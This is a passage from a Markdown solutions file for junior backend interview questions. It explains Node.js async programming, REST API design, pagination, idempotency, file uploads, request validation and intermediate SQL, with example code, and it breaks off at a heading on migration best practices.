# ✅ Solutions — Day 2: 1 Year Experience (1 YOE)

> **Series:** Backend Interview Prep · Fresher → 10 Years of Experience  
> **Level:** Junior Developer — 1 Year of Experience  
> **Questions File:** [day-02-1yoe.md](./day-02-1yoe.md)  
> **Total Answers:** 60  

> 💡 **Tip:** Every answer here includes a real-world example. Try to relate each concept to something you've built or used before reading the solution.

---

## 📚 Table of Contents

1. [Async Programming & Concurrency](#1-async-programming--concurrency)
2. [REST API Design Best Practices](#2-rest-api-design-best-practices)
3. [Database & SQL — Intermediate](#3-database--sql--intermediate)
4. [Authentication & Sessions](#4-authentication--sessions)
5. [Error Handling & Logging](#5-error-handling--logging)
6. [Testing Basics](#6-testing-basics)
7. [Node.js / Backend Runtime Concepts](#7-nodejs--backend-runtime-concepts)
8. [Package Management & Dependency Handling](#8-package-management--dependency-handling)
9. [Basic DevOps & Deployment](#9-basic-devops--deployment)
10. [Code Quality & Design Patterns](#10-code-quality--design-patterns)

---

## 1. Async Programming & Concurrency

---

**Q1. What is the difference between synchronous and asynchronous programming?**

**Answer:**

**Synchronous** code executes line by line — each operation blocks the next until it completes. Simple but wasteful when waiting on slow operations (disk, network, DB).

**Asynchronous** code allows the program to start an operation and move on. A callback/promise/event notifies it when the result is ready — no blocking.

**Real-world analogy:** Synchronous is like standing at a coffee shop counter and waiting until your coffee is ready before doing anything else. Asynchronous is like getting a buzzer, going to sit down and check your phone, and coming back only when the buzzer goes off.

**Code Example:**

```js
// ❌ Synchronous — blocks the entire server for every request
const express = require('express');
const fs = require('fs');
const app = express();

app.get('/report', (req, res) => {
  // This blocks ALL other requests while reading the file
  const data = fs.readFileSync('/var/data/report.csv'); // BLOCKING
  res.send(data);
});

// ✅ Asynchronous — non-blocking, handles thousands of concurrent requests
app.get('/report', async (req, res) => {
  const data = await fs.promises.readFile('/var/data/report.csv'); // NON-BLOCKING
  res.send(data);
});
```

**Why it matters in backend:** A Node.js server is single-threaded. One synchronous file read or DB call blocks the entire server from handling other requests. Async allows 10,000 concurrent connections on a single thread.

> 📖 Reference: [Async Programming — MDN](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Introducing)

---

**Q2. What is a callback function? What is "callback hell" and how do you avoid it?**

**Answer:**

A **callback** is a function passed as an argument to another function, to be called when an async operation completes.

**Callback Hell** (also called the "Pyramid of Doom") happens when callbacks are nested inside callbacks inside callbacks, making the code deeply indented and nearly impossible to read, debug, or maintain.

**Example of Callback Hell:**

```js
// ❌ Callback Hell — reading user, then their orders, then order items
getUserById(userId, (err, user) => {
  if (err) return handleError(err);

  getOrdersByUser(user.id, (err, orders) => {
    if (err) return handleError(err);

    getItemsByOrder(orders[0].id, (err, items) => {
      if (err) return handleError(err);

      getProductDetails(items[0].productId, (err, product) => {
        if (err) return handleError(err);

        // Finally do something useful...
        console.log(product.name); // 4 levels deep 😱
      });
    });
  });
});
```

**How to avoid it:**

```js
// ✅ Solution 1: Promises
getUserById(userId)
  .then(user => getOrdersByUser(user.id))
  .then(orders => getItemsByOrder(orders[0].id))
  .then(items => getProductDetails(items[0].productId))
  .then(product => console.log(product.name))
  .catch(err => handleError(err));

// ✅ Solution 2: async/await (cleanest)
async function getUserProduct(userId) {
  try {
    const user    = await getUserById(userId);
    const orders  = await getOrdersByUser(user.id);
    const items   = await getItemsByOrder(orders[0].id);
    const product = await getProductDetails(items[0].productId);
    console.log(product.name);
  } catch (err) {
    handleError(err);
  }
}
```

> 📖 Reference: [Callback Hell — callbackhell.com](http://callbackhell.com/)

---

**Q3. What is a Promise? Explain the three states of a Promise.**

**Answer:**

A **Promise** is an object that represents the eventual result of an asynchronous operation. It is a placeholder for a value that isn't available yet.

**Three States:**

| State | Meaning | Can transition to |
|-------|---------|-------------------|
| **Pending** | Initial state — operation in progress | Fulfilled or Rejected |
| **Fulfilled** | Operation succeeded — value is available | — (terminal) |
| **Rejected** | Operation failed — error is available | — (terminal) |

Once a Promise settles (fulfilled or rejected), it cannot change state again.

**Code Example:**

```js
// Creating a Promise
const fetchUser = (id) => {
  return new Promise((resolve, reject) => {
    db.query('SELECT * FROM users WHERE id = ?', [id], (err, result) => {
      if (err) reject(err);          // → Rejected state
      else     resolve(result[0]);   // → Fulfilled state
    });
  });
};

// Consuming a Promise
fetchUser(42)
  .then(user => console.log('Got user:', user.name))  // runs on Fulfilled
  .catch(err => console.error('Failed:', err.message)) // runs on Rejected
  .finally(() => console.log('Done'));                  // runs always

// Real-world example: fetch() returns a Promise
const response = await fetch('https://api.example.com/users');
// Response is pending while the network request is in flight
// Fulfilled once the server responds
// Rejected if there's a network error
```

> 📖 Reference: [Promises — MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)

---

**Q4. What is `async/await`? How does it improve on Promises?**

**Answer:**

`async/await` is syntactic sugar over Promises that makes asynchronous code look and behave like synchronous code. An `async` function always returns a Promise. `await` pauses execution inside the function until the Promise resolves — without blocking the event loop.

**Comparison — same logic, 3 styles:**

```js
// Style 1: Callbacks (messy)
getUserById(1, (err, user) => {
  if (err) return handleError(err);
  getOrders(user.id, (err, orders) => { /* ... */ });
});

// Style 2: Promises (better)
getUserById(1)
  .then(user => getOrders(user.id))
  .then(orders => console.log(orders))
  .catch(handleError);

// Style 3: async/await (best readability)
async function loadUserOrders(userId) {
  try {
    const user   = await getUserById(userId);   // waits here
    const orders = await getOrders(user.id);    // then waits here
    console.log(orders);
  } catch (err) {
    handleError(err);
  }
}
```

**Key advantages of async/await over raw Promises:**
- Looks synchronous — easier to read and reason about.
- Standard `try/catch` for error handling instead of `.catch()` chains.
- Easier to use with loops and conditionals.

```js
// ✅ async/await works naturally in loops
async function sendEmailToAllUsers(userIds) {
  for (const id of userIds) {
    const user = await getUserById(id);  // sequential, one at a time
    await sendEmail(user.email);
  }
}

// ✅ Or in parallel using Promise.all
async function sendEmailsInParallel(userIds) {
  const users = await Promise.all(userIds.map(id => getUserById(id)));
  await Promise.all(users.map(u => sendEmail(u.email)));
}
```

> 📖 Reference: [async/await — MDN](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous/Promises)

---

**Q5. What is the Event Loop? How does it work in Node.js?**

**Answer:**

The **Event Loop** is the mechanism that allows Node.js to perform non-blocking I/O on a single thread. It continuously checks if there are tasks to execute, picks them up, and runs them.

**How it works step by step:**

```
┌─────────────────────────────────────────────┐
│             Node.js Process                 │
│                                             │
│  ┌──────────┐    ┌─────────────────────┐   │
│  │ Call     │    │   Event Loop        │   │
│  │ Stack    │◄───│  (picks up tasks)   │   │
│  └──────────┘    └─────────────────────┘   │
│                          ▲                  │
│  ┌──────────────────────────────────────┐  │
│  │         Callback Queues              │  │
│  │  ┌──────────┐  ┌──────────────────┐ │  │
│  │  │Microtask │  │  Macrotask Queue  │ │  │
│  │  │  Queue   │  │ (setTimeout,      │ │  │
│  │  │(Promises,│  │  setInterval,     │ │  │
│  │  │queueMicro│  │  I/O callbacks)   │ │  │
│  │  │task)     │  └──────────────────┘ │  │
│  │  └──────────┘                       │  │
│  └──────────────────────────────────────┘  │
│                                             │
│  ┌──────────────────────────────────────┐  │
│  │  libuv Thread Pool (I/O operations)  │  │
│  └──────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
```

**Execution order example:**

```js
console.log('1 - Start');                         // synchronous

setTimeout(() => console.log('4 - setTimeout'), 0); // macrotask queue

Promise.resolve()
  .then(() => console.log('3 - Promise'));          // microtask queue

console.log('2 - End');                            // synchronous

// Output order: 1, 2, 3, 4
// Microtasks (Promises) always run before macrotasks (setTimeout)
```

**Real-world implication:**

```js
// ❌ This BLOCKS the event loop for 3 seconds — no other request handled!
app.get('/bad', (req, res) => {
  const start = Date.now();
  while (Date.now() - start < 3000) {}  // CPU busy-wait
  res.send('done');
});

// ✅ This is non-blocking — event loop is free to handle other requests
app.get('/good', async (req, res) => {
  const data = await db.query('SELECT ...');  // I/O handled by libuv, not event loop
  res.send(data);
});
```

> 📖 Reference: [Event Loop — Node.js Docs](https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick)

---

**Q6. What is the difference between `Promise.all()`, `Promise.race()`, `Promise.allSettled()`, and `Promise.any()`?**

**Answer:**

All four accept an array of Promises but behave differently:

| Method | Resolves when | Rejects when | Use case |
|--------|-------------|--------------|---------|
| `Promise.all()` | ALL resolve | ANY rejects | Parallel calls that all must succeed |
| `Promise.race()` | FIRST settles (resolve or reject) | FIRST rejects | Timeout pattern |
| `Promise.allSettled()` | ALL settle (either way) | Never | Run all, inspect each result |
| `Promise.any()` | FIRST resolves | ALL reject | Fastest successful result |

**Code Examples:**

```js
const fetchUser    = () => fetch('/api/user');
const fetchOrders  = () => fetch('/api/orders');
const fetchProfile = () => fetch('/api/profile');

// ✅ Promise.all — fetch all 3 in parallel; fail fast if any fails
try {
  const [user, orders, profile] = await Promise.all([
    fetchUser(), fetchOrders(), fetchProfile()
  ]);
  console.log(user, orders, profile); // all available
} catch (err) {
  console.error('One of them failed:', err); // entire thing fails
}

// ✅ Promise.race — implement a timeout
const timeout = new Promise((_, reject) =>
  setTimeout(() => reject(new Error('Timed out')), 3000)
);
try {
  const result = await Promise.race([fetchUser(), timeout]);
} catch (err) {
  console.error('Either timed out or fetch failed');
}

// ✅ Promise.allSettled — run all, don't fail on individual errors
const results = await Promise.allSettled([
  fetchUser(), fetchOrders(), fetchProfile()
]);
results.forEach(r => {
  if (r.status === 'fulfilled') console.log('✅', r.value);
  else console.log('❌', r.reason);
});

// ✅ Promise.any — use whichever CDN responds first
const image = await Promise.any([
  fetch('https://cdn1.example.com/img.jpg'),
  fetch('https://cdn2.example.com/img.jpg'),
  fetch('https://cdn3.example.com/img.jpg'),
]);
// Returns the first successful response
```

> 📖 Reference: [Promise combinators — MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#static_methods)

---

**Q7. What is a race condition? How can it occur in a backend system?**

**Answer:**

A **race condition** occurs when the outcome of a program depends on the relative timing of concurrent operations — and that timing is unpredictable. Two operations "race" to complete, and whichever wins changes the result.

**Classic example — bank account:**

```
Initial balance: $100
User A withdraws $100 (checks balance → $100, ok to proceed)
User B withdraws $100 (checks balance → $100, ok to proceed)  ← race!
User A completes: balance = $0
User B completes: balance = -$100  ← overdraft! 💸
```

**Code Example — race condition in Node.js:**

```js
// ❌ Race condition: two concurrent requests can both pass the check
app.post('/book-seat', async (req, res) => {
  const seat = await db.query(
    'SELECT * FROM seats WHERE id = ? AND status = "available"', [req.body.seatId]
  );

  if (!seat) return res.status(400).json({ error: 'Seat not available' });

  // GAP: another request can pass the check here before this UPDATE runs
  await db.query(
    'UPDATE seats SET status = "booked" WHERE id = ?', [req.body.seatId]
  );

  res.json({ success: true }); // Both requests might succeed! 😱
});

// ✅ Fix 1: Atomic UPDATE with condition check
app.post('/book-seat', async (req, res) => {
  const result = await db.query(
    'UPDATE seats SET status = "booked" WHERE id = ? AND status = "available"',
    [req.body.seatId]
  );

  if (result.affectedRows === 0) {
    return res.status(400).json({ error: 'Seat not available' });
  }
  res.json({ success: true }); // Only ONE request wins
});

// ✅ Fix 2: Database-level locking
await db.query('BEGIN');
const seat = await db.query(
  'SELECT * FROM seats WHERE id = ? FOR UPDATE', [seatId] // row-level lock
);
if (seat.status !== 'available') {
  await db.query('ROLLBACK');
  return res.status(400).json({ error: 'Not available' });
}
await db.query('UPDATE seats SET status = "booked" WHERE id = ?', [seatId]);
await db.query('COMMIT');
```

> 📖 Reference: [Race Conditions — OWASP](https://owasp.org/www-community/vulnerabilities/Race_Conditions)

---

**Q8. What is the difference between I/O-bound and CPU-bound tasks? Why does it matter?**

**Answer:**

- **I/O-bound:** The bottleneck is waiting for input/output — disk reads, network calls, database queries. The CPU is idle most of the time, waiting for data.
- **CPU-bound:** The bottleneck is computation — the CPU is working at 100% the entire time. Examples: image resizing, video encoding, cryptography, complex calculations.

**Why it matters for Node.js specifically:**

```js
// ✅ I/O-bound — Node.js excels here
// The event loop handles thousands of these concurrently
app.get('/users', async (req, res) => {
  const users = await db.query('SELECT * FROM users'); // I/O — CPU is free
  res.json(users);
});

// ❌ CPU-bound — Node.js single thread is BLOCKED
app.get('/thumbnail', async (req, res) => {
  // This takes 500ms of pure CPU work
  const thumbnail = resizeImage(req.file.buffer, 200, 200); // BLOCKS event loop!
  res.send(thumbnail);
  // While this runs, NO other request can be handled
});

// ✅ Fix for CPU-bound: offload to a worker thread
const { Worker } = require('worker_threads');

app.get('/thumbnail', (req, res) => {
  const worker = new Worker('./image-worker.js', {
    workerData: { buffer: req.file.buffer }
  });
  worker.on('message', (thumbnail) => res.send(thumbnail));
  // Main thread is FREE to handle other requests
});
```

**Summary:**

| Task Type | Node.js handles well? | Solution |
|-----------|----------------------|---------|
| DB queries, HTTP calls, file reads | ✅ Excellent | async/await |
| Image processing, PDF generation, encryption | ❌ Blocks event loop | Worker threads, separate service |

> 📖 Reference: [I/O vs CPU Bound — freeCodeCamp](https://www.freecodecamp.org/news/cpu-bound-vs-i-o-bound-tasks/)

---

## 2. REST API Design Best Practices

---

**Q9. What makes an API truly RESTful? What are common mistakes developers make?**

**Answer:**

A truly RESTful API follows these design principles:

1. **Resource-based URLs** (nouns, not verbs)
2. **HTTP methods** convey the action
3. **Stateless** — no server-side client state
4. **Consistent response format**
5. **Meaningful status codes**

**Common mistakes with examples:**

```
❌ BAD (verb-based URLs)          ✅ GOOD (resource-based URLs)
GET  /getUsers                    GET  /users
POST /createUser                  POST /users
POST /deleteUser/5                DELETE /users/5
GET  /getUserOrders/5             GET  /users/5/orders
POST /updateUserEmail             PATCH /users/5

❌ BAD (wrong HTTP methods)       ✅ GOOD
GET /users/delete/5               DELETE /users/5
POST /users/5/get-orders          GET /users/5/orders

❌ BAD (inconsistent responses)
{ data: [...] }    // sometimes
{ users: [...] }   // other times
{ result: [...] }  // yet another time

✅ GOOD (consistent envelope)
{ "data": [...], "meta": { "total": 100, "page": 1 } }

❌ BAD (wrong status codes)
DELETE /users/5 → 200 OK with { "message": "User deleted" }
POST /users with missing fields → 200 OK with { "error": "name required" }

✅ GOOD
DELETE /users/5 → 204 No Content
POST /users with missing fields → 400 Bad Request
```

> 📖 Reference: [REST API Design Best Practices — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/best-practices/api-design)

---

**Q10. How should you version a REST API? What are the common strategies?**

**Answer:**

API versioning allows you to evolve your API without breaking existing clients.

**3 common strategies:**

```
1. URL Path Versioning (most common, most visible)
   GET /v1/users
   GET /v2/users

2. Query Parameter Versioning
   GET /users?version=1
   GET /users?api-version=2

3. Header Versioning (cleanest URLs, harder to test in browser)
   GET /users
   Headers: { "API-Version": "2" }
            { "Accept": "application/vnd.myapi.v2+json" }
```

**Real-world example:**

```js
// Express route versioning
const routerV1 = express.Router();
const routerV2 = express.Router();

// V1: returns full user object
routerV1.get('/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // includes all fields
});

// V2: returns user with nested profile, deprecates old fields
routerV2.get('/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id).populate('profile');
  res.json({
    id: user.id,
    name: user.name,
    profile: user.profile // new field in v2
    // 'age' field removed in v2
  });
});

app.use('/v1', routerV1);
app.use('/v2', routerV2);
```

**Tip:** Always add a deprecation header when sunsetting a version:
```
Deprecation: true
Sunset: Sat, 31 Dec 2025 23:59:59 GMT
```

> 📖 Reference: [API Versioning — Stripe Blog](https://stripe.com/blog/api-versioning)

---

**Q11. What is HATEOAS? Is it practically used?**

**Answer:**

**HATEOAS** (Hypermedia As The Engine Of Application State) is a REST constraint where API responses include links to related actions, so clients don't need to hardcode URLs.

**Example:**

```json
// Without HATEOAS — client must know all URLs upfront
{ "id": 5, "name": "Alice", "status": "active" }

// With HATEOAS — response tells the client what it can do next
{
  "id": 5,
  "name": "Alice",
  "status": "active",
  "_links": {
    "self":    { "href": "/users/5",         "method": "GET" },
    "orders":  { "href": "/users/5/orders",  "method": "GET" },
    "update":  { "href": "/users/5",         "method": "PATCH" },
    "deactivate": { "href": "/users/5/deactivate", "method": "POST" }
  }
}
```

**Is it practically used?** Rarely in its pure form. Most real-world APIs (Stripe, GitHub, Twilio) use URL versioning and documentation instead of dynamic hypermedia links. HATEOAS adds response payload size and client complexity.

It's worth knowing for interviews, but don't over-engineer APIs with it unless you have a specific need (e.g., a truly dynamic workflow API).

> 📖 Reference: [HATEOAS — REST API Tutorial](https://restfulapi.net/hateoas/)

---

**Q12. How would you design a pagination API? Explain offset vs cursor-based pagination.**

**Answer:**

**1. Offset-based pagination:**

```
GET /users?page=3&limit=20
GET /users?offset=40&limit=20
```

```js
// Implementation
app.get('/users', async (req, res) => {
  const page  = parseInt(req.query.page)  || 1;
  const limit = parseInt(req.query.limit) || 20;
  const offset = (page - 1) * limit;

  const [users, total] = await Promise.all([
    db.query('SELECT * FROM users ORDER BY id LIMIT ? OFFSET ?', [limit, offset]),
    db.query('SELECT COUNT(*) as total FROM users')
  ]);

  res.json({
    data: users,
    meta: {
      page,
      limit,
      total: total[0].total,
      totalPages: Math.ceil(total[0].total / limit)
    }
  });
});
```

**Problem with offset:** If a new row is inserted while you're paginating, rows shift — you see duplicates or skip rows.

---

**2. Cursor-based pagination (recommended for real-time data):**

```
GET /users?limit=20                          → returns cursor
GET /users?after=eyJpZCI6MjB9&limit=20      → next page
```

```js
// Implementation using opaque cursor (base64-encoded ID)
app.get('/users', async (req, res) => {
  const limit  = parseInt(req.query.limit) || 20;
  const cursor = req.query.after
    ? JSON.parse(Buffer.from(req.query.after, 'base64').toString())
    : null;

  const query = cursor
    ? 'SELECT * FROM users WHERE id > ? ORDER BY id ASC LIMIT ?'
    : 'SELECT * FROM users ORDER BY id ASC LIMIT ?';

  const params = cursor ? [cursor.id, limit + 1] : [limit + 1];
  const users = await db.query(query, params);

  const hasMore = users.length > limit;
  if (hasMore) users.pop(); // remove the extra item

  const nextCursor = hasMore
    ? Buffer.from(JSON.stringify({ id: users[users.length - 1].id })).toString('base64')
    : null;

  res.json({
    data: users,
    pagination: {
      hasMore,
      nextCursor
    }
  });
});
```

| | Offset | Cursor |
|--|--------|--------|
| Simple to implement | ✅ | ❌ |
| Works with "jump to page" | ✅ | ❌ |
| Stable under inserts/deletes | ❌ | ✅ |
| Scalable on large datasets | ❌ (OFFSET is slow) | ✅ |

> 📖 Reference: [Pagination Best Practices — Slack Engineering](https://slack.engineering/evolving-api-pagination-at-slack/)

---

**Q13. What is idempotency? Which HTTP methods should be idempotent?**

**Answer:**

An operation is **idempotent** if calling it multiple times produces the same result as calling it once. The state of the server is the same whether you called it 1 time or 100 times.

| Method | Idempotent? | Reason |
|--------|------------|--------|
| GET | ✅ Yes | Just reads data, no side effects |
| PUT | ✅ Yes | Replaces resource with same data each time |
| DELETE | ✅ Yes | Deleting an already-deleted resource → same end state |
| PATCH | ✅ Usually | "Set email to X" is idempotent; "increment counter" is not |
| POST | ❌ No | Creates a new resource each time |

**Real-world example — payment API:**

```js
// ❌ Non-idempotent POST — calling twice charges the user twice!
POST /payments
{ "amount": 1000, "card": "4111..." }
// → Payment #101 created, $10 charged
// → Payment #102 created, $10 charged again! 😱

// ✅ Idempotent with idempotency key — safe to retry
POST /payments
Headers: { "Idempotency-Key": "order-456-payment-attempt-1" }
{ "amount": 1000, "card": "4111..." }
// → First call: Payment #101 created, $10 charged
// → Second call: Returns same Payment #101, no new charge ✅

// Server implementation
app.post('/payments', async (req, res) => {
  const idempotencyKey = req.headers['idempotency-key'];

  if (idempotencyKey) {
    const existing = await cache.get(`payment:${idempotencyKey}`);
    if (existing) return res.json(existing); // return cached result
  }

  const payment = await createPayment(req.body);

  if (idempotencyKey) {
    await cache.set(`payment:${idempotencyKey}`, payment, { ttl: 86400 });
  }

  res.status(201).json(payment);
});
```

> 📖 Reference: [Idempotency — MDN](https://developer.mozilla.org/en-US/docs/Glossary/Idempotent)

---

**Q14. How do you handle file uploads in a REST API?**

**Answer:**

**Two main approaches:**

**1. Direct upload via multipart/form-data (small files):**

```js
const multer  = require('multer');
const upload  = multer({
  storage: multer.memoryStorage(),         // store in memory
  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB max
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowed.includes(file.mimetype)) cb(null, true);
    else cb(new Error('Invalid file type'), false);
  }
});

app.post('/users/:id/avatar', upload.single('avatar'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });

  // Save to S3
  const s3Url = await uploadToS3({
    bucket: 'my-app-avatars',
    key:    `avatars/${req.params.id}-${Date.now()}.jpg`,
    body:   req.file.buffer,
    contentType: req.file.mimetype
  });

  await db.query('UPDATE users SET avatar_url = ? WHERE id = ?',
    [s3Url, req.params.id]);

  res.json({ avatarUrl: s3Url });
});
```

**2. Presigned URL approach (large files — recommended for production):**

```
Client                          Server                     S3
  │                                │                        │
  │── POST /upload-url ──────────►│                        │
  │   { filename, contentType }    │── generate presigned ─►│
  │                                │◄── presigned URL ──────│
  │◄── { uploadUrl, fileKey } ────│                        │
  │                                │                        │
  │── PUT presignedUrl (file) ─────────────────────────────►│
  │◄── 200 OK ─────────────────────────────────────────────│
  │                                │                        │
  │── POST /confirm-upload ──────►│                        │
  │   { fileKey }                  │── update DB ──────────►│
  │◄── { fileUrl } ───────────────│                        │
```

```js
// Server generates presigned URL — client uploads directly to S3
app.post('/upload-url', async (req, res) => {
  const { filename, contentType } = req.body;
  const fileKey = `uploads/${Date.now()}-${filename}`;

  const presignedUrl = await s3.getSignedUrlPromise('putObject', {
    Bucket:      'my-app-uploads',
    Key:         fileKey,
    ContentType: contentType,
    Expires:     300 // URL valid for 5 minutes
  });

  res.json({ uploadUrl: presignedUrl, fileKey });
});
```

> 📖 Reference: [File Uploads — Multer Docs](https://github.com/expressjs/multer)

---

**Q15. What is request validation and why is it critical? How do you implement it?**

**Answer:**

Request validation ensures incoming data matches expected types, formats, and constraints **before** it reaches your business logic or database. Without it, malformed data causes crashes, corrupts the database, or enables attacks.

**Why it's critical:**
- **Security:** Prevents injection attacks, malformed payloads.
- **Data integrity:** Ensures the DB never gets garbage data.
- **Developer experience:** Returns clear error messages instead of 500 crashes.

**Example using Zod (Node.js):**

```js
const { z } = require('zod');

// Define schema
const createUserSchema = z.object({
  name:  z.string().min(2).max(100),
  email: z.string().email(),
  age:   z.number().int().min(13).max(120).optional(),
  role:  z.enum(['user', 'admin']).default('user'),
});

// Validation middleware
const validate = (schema) => (req, res, next) => {
  const result = schema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: result.error.errors.map(e => ({
        field:   e.path.join('.'),
        message: e.message
      }))
    });
  }
  req.body = result.data; // use parsed + coerced data
  next();
};

// Use it on a route
app.post('/users', validate(createUserSchema), async (req, res) => {
  // req.body is now guaranteed to be valid
  const user = await User.create(req.body);
  res.status(201).json(user);
});

// Example error response for { name: "A", email: "not-an-email" }
// {
//   "error": "Validation failed",
//   "details": [
//     { "field": "name",  "message": "String must contain at least 2 characters" },
//     { "field": "email", "message": "Invalid email" }
//   ]
// }
```

> 📖 Reference: [Input Validation — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

---

**Q16. What is the difference between query params, path params, and request body? When do you use each?**

**Answer:**

```
Full URL example:
POST https://api.example.com/v1/users/42/orders?status=pending&limit=10
                                         ▲               ▲
                                     path param       query params
+ Body: { "productId": 99, "quantity": 2 }
```

| Type | Location | Use for | Example |
|------|----------|---------|---------|
| **Path params** | URL path | Required identifiers, resource IDs | `/users/:id`, `/posts/:postId/comments/:commentId` |
| **Query params** | URL `?key=value` | Optional filters, sorting, pagination | `?status=active&sort=name&page=2` |
| **Request body** | HTTP body | Creating/updating resource data | `{ "name": "Alice", "email": "..." }` |

**Real-world examples:**

```js
// Path param: required to identify WHICH resource
app.get('/users/:userId/orders/:orderId', async (req, res) => {
  const { userId, orderId } = req.params; // /users/42/orders/99
  const order = await Order.findOne({ id: orderId, userId });
  res.json(order);
});

// Query params: optional filters
app.get('/products', async (req, res) => {
  const {
    category,             // filter by category
    minPrice,             // filter by price range
    sort = 'createdAt',   // sort field
    order = 'desc',       // sort direction
    page = 1,             // pagination
    limit = 20
  } = req.query;
  // GET /products?category=electronics&minPrice=100&sort=price&order=asc
});

// Request body: data for creating/updating
app.post('/users', async (req, res) => {
  const { name, email, password } = req.body;
  // Never put sensitive data in URL — it gets logged, cached, and visible in browser history
});
```

**Golden rule:** Sensitive data (passwords, tokens) and large payloads always go in the body — never in the URL.

> 📖 Reference: [API Parameters — Swagger Docs](https://swagger.io/docs/specification/describing-parameters/)

---

## 3. Database & SQL — Intermediate

---

**Q17. What is the N+1 query problem? How do you detect and fix it?**

**Answer:**

The **N+1 problem** occurs when code executes 1 query to get a list of N items, then fires N additional queries — one per item. Total: N+1 queries instead of 1 or 2.

**Example — blog with authors:**

```js
// ❌ N+1 Problem
const posts = await db.query('SELECT * FROM posts LIMIT 10'); // 1 query

for (const post of posts) {
  // 10 separate queries — one per post!
  post.author = await db.query(
    'SELECT * FROM users WHERE id = ?', [post.author_id]
  );
}
// Total: 11 queries for 10 posts 😱
// For 1000 posts: 1001 queries!

// ✅ Fix 1: SQL JOIN — fetch everything in one query
const posts = await db.query(`
  SELECT p.*, u.name as author_name, u.email as author_email
  FROM posts p
  JOIN users u ON u.id = p.author_id
  LIMIT 10
`); // 1 query ✅

// ✅ Fix 2: WHERE IN — fetch all authors in one batch query
const posts = await db.query('SELECT * FROM posts LIMIT 10');
const authorIds = [...new Set(posts.map(p => p.author_id))];

const authors = await db.query(
  'SELECT * FROM users WHERE id IN (?)', [authorIds]
); // 2 queries total ✅

const authorMap = Object.fromEntries(authors.map(a => [a.id, a]));
posts.forEach(p => p.author = authorMap[p.author_id]);

// ✅ Fix 3: ORM eager loading (Sequelize example)
const posts = await Post.findAll({
  include: [{ model: User, as: 'author' }], // JOIN under the hood
  limit: 10
}); // 1 or 2 queries ✅
```

**How to detect it:**
- Enable SQL query logging and look for repetitive queries.
- Use tools like Sequelize debug mode, Django Debug Toolbar, or APM tools (Datadog, New Relic).

> 📖 Reference: [N+1 Problem — Stackify](https://stackify.com/n-plus-one-query/)

---

**Q18. What is the difference between an inner join and an outer join? Give a practical example.**

**Answer:**

**Setup:**
```sql
-- users table          -- orders table
-- id | name            -- id | user_id | total
-- 1  | Alice           -- 1  | 1       | 50
-- 2  | Bob             -- 2  | 1       | 30
-- 3  | Charlie         -- (Bob and Charlie have no orders)
```

```sql
-- INNER JOIN: only users WHO HAVE orders
SELECT u.name, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
-- Result:
-- Alice | 50
-- Alice | 30
-- (Bob and Charlie excluded — no matching rows)

-- LEFT JOIN: ALL users, with orders if they exist (NULL if not)
SELECT u.name, o.total
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
-- Result:
-- Alice   | 50
-- Alice   | 30
-- Bob     | NULL   ← no orders, but Bob appears
-- Charlie | NULL   ← no orders, but Charlie appears

-- RIGHT JOIN: all orders + matched users (rare; use LEFT JOIN instead)
SELECT u.name, o.total
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;

-- FULL OUTER JOIN: all rows from both tables
SELECT u.name, o.total
FROM users u
FULL OUTER JOIN orders o ON u.id = o.user_id;
-- Alice   | 50
-- Alice   | 30
-- Bob     | NULL
-- Charlie | NULL
```

**When to use:**
- INNER JOIN: "Give me users with orders" (intersection)
- LEFT JOIN: "Give me all users and their orders if any" (all from left)
- FULL OUTER JOIN: "Give me everything from both tables" (union)

> 📖 Reference: [SQL JOINs — Mode Analytics](https://mode.com/sql-tutorial/sql-joins/)

---

**Q19. What is a database view? When would you use one?**

**Answer:**

A **view** is a virtual table defined by a stored SQL query. It doesn't store data itself — it runs the underlying query each time it's accessed.

```sql
-- Without view: repeat this complex JOIN everywhere
SELECT
  u.id, u.name, u.email,
  COUNT(o.id)     AS order_count,
  SUM(o.total)    AS total_spent,
  MAX(o.created_at) AS last_order_date
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.name, u.email;

-- ✅ Create a view once
CREATE VIEW user_order_summary AS
SELECT
  u.id, u.name, u.email,
  COUNT(o.id)       AS order_count,
  COALESCE(SUM(o.total), 0) AS total_spent,
  MAX(o.created_at) AS last_order_date
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.name, u.email;

-- Now query it anywhere like a table
SELECT * FROM user_order_summary WHERE total_spent > 500;
SELECT * FROM user_order_summary ORDER BY order_count DESC LIMIT 10;
```

**When to use views:**
- **Simplify complex queries** — hide JOINs and aggregations.
- **Security** — expose only specific columns (hide `password_hash`, `credit_card`).
- **Backward compatibility** — when renaming tables, keep old view names.
- **Reporting** — give analysts access to pre-joined data without raw table access.

**Limitation:** Views don't cache data. Use a **materialized view** if performance is critical.

> 📖 Reference: [Database Views — PostgreSQL Docs](https://www.postgresql.org/docs/current/sql-createview.html)

---

**Q20. What is a database migration? Why is it important in production systems?**

**Answer:**

A **database migration** is a versioned, incremental change to the database schema (adding/dropping tables, columns, indexes) that is tracked in code and can be applied or rolled back.

**Why it matters in production:**
- Schema changes must be deployed alongside code changes in a controlled, repeatable way.
- Multiple developers may modify the schema — migrations prevent conflicts.
- Rollback is possible when something goes wrong.
- Audit trail of every schema change.

**Example using Prisma migrations:**

```bash
# Create a migration file
npx prisma migrate dev --name add_phone_to_users
```

```sql
-- Generated migration file: 20240601_add_phone_to_users.sql
ALTER TABLE users ADD COLUMN phone VARCHAR(20);
CREATE INDEX idx_users_phone ON users(phone);
```

**Production migration best practices:**

